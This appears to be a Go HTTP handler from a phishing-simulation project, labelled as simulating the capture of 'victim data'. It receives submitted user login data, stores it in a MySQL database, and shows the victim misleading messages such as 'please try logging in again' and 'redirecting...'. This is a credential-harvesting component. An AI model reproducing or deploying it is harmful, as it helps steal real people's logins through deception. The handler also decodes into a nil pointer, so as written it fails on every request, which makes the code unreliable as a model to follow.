package handlers

import (
	"encoding/json"
	"net/http"

	"github.com/h3th-IV/mackerel/internal/database"
	"github.com/h3th-IV/mackerel/internal/models"
	"go.uber.org/zap"
)

/*
THis Handler/controller is used to simulate capturing victim data
*/

var (
	_ http.Handler = &CaptureDataHandler{}
)

type CaptureDataHandler struct {
	logger      *zap.Logger
	mysqlclient database.Database
}

func NewCaptureHandler(logger *zap.Logger, mysqlclient database.Database) *CaptureDataHandler {
	return &CaptureDataHandler{
		logger:      logger,
		mysqlclient: mysqlclient,
	}
}

func (handler *CaptureDataHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	var (
		user *models.User
		TTL  = 30
	)
	resp := map[string]interface{}{}
	if err := json.NewDecoder(r.Body).Decode(user); err != nil {
		resp["err"] = "please try logging in again"
		handler.logger.Error("err decoding data", zap.Error(err))
		apiResponse(w, GetErrorResponseBytes(resp, TTL, nil), http.StatusBadRequest)
		return
	}

	captured, err := handler.mysqlclient.CaptureData(r.Context(), user)
	if err != nil {
		resp["err"] = "unable to redirect"
		handler.logger.Error("err capturing data", zap.Error(err))
		apiResponse(w, GetErrorResponseBytes(resp, TTL, nil), http.StatusInternalServerError)
		return
	}
	if !captured {
		resp["err"] = "unable to redirect"
		handler.logger.Error("err writing data to db, returned without err", zap.Bool("", captured))
		apiResponse(w, GetErrorResponseBytes(resp, TTL, nil), http.StatusInternalServerError)
		return
	}
	resp["message"] = "redirecting..."
	apiResponse(w, GetSuccessResponse(resp, TTL), http.StatusPermanentRedirect)
}
